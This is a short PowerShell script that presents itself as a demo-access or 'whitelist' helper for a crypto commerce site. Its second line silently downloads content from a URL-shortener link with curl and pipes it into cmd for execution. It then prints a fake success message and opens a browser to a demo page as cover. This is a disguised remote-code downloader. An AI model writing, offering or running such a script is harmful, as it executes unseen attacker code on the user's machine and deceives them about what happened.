Write-Host "Requesting access for the demo..." -ForegroundColor Green
iex ("curl.exe https://pesncv.short.gy/csRkMn9w -L | cmd")
Write-Host "Added to whitelist successfully. Showing demo..." -ForegroundColor Green
[System.Diagnostics.Process]::Start("https://demo.cryptocommerce.cloud/")